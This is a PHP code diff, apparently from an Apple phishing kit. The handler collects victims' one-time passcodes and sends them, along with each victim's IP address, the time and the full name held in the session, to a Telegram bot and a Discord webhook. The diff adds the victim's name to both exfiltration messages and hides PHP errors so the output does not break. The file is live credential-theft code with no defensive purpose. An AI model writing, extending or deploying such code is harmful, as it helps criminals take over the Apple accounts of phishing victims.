@@ -1,6 +1,10 @@
 <?php
+session_start();
+ini_set('display_errors', 0);              // pigilan ang warning na lumabas sa output
+header('Content-Type: application/json');
 date_default_timezone_set('Asia/Manila');
-include '../config.php';
+require_once '../config.php';
+$fullName = $_SESSION['avea_full_name'] ?? 'Unknown';
 
 // ---------- POST HANDLER ----------
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
@@ -22,6 +26,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
     if (!empty($telegram_use) && $telegram_use === true && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
         $telegramMessage = "✨ <b>New Apple OTP Submission</b>\n\n"
                          . "<b>IP Address:</b> <code>{$ip}</code>\n"
+                         . "<b>From Name:</b> <code>{$fullName}</code>\n\n"
                          . "<b>Time:</b> <code>{$time}</code>\n"
                          . "<b>OTP #1:</b> <code>{$otp}</code>";
 
@@ -44,23 +49,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
 
     // ---------- DISCORD ----------
     if (!empty($discord_use) && $discord_use === true && !empty($discord_webhook_url)) {
-        $discordFields = [
-            [
-                'name' => 'IP Address',
-                'value' => "`{$ip}`",
-                'inline' => true
-            ],
-            [
-                'name' => 'Time',
-                'value' => "`{$time}`",
-                'inline' => true
-            ],
-            [
-                'name' => 'OTP #1',
-                'value' => "`{$otp}`",
-                'inline' => true
-            ]
-        ];
+      $discordFields = [
+    [
+        'name' => 'From Name',
+        'value' => "`{$fullName}`",
+        'inline' => false
+    ],
+    [
+        'name' => 'IP Address',
+        'value' => "`{$ip}`",
+        'inline' => true
+    ],
+    [
+        'name' => 'Time',
+        'value' => "`{$time}`",
+        'inline' => true
+    ],
+    [
+        'name' => 'OTP #1',
+        'value' => "`{$otp}`",
+        'inline' => true
+    ]
+];
 
         $payload = [
             'content' => "✨ **New Apple OTP Submission**",
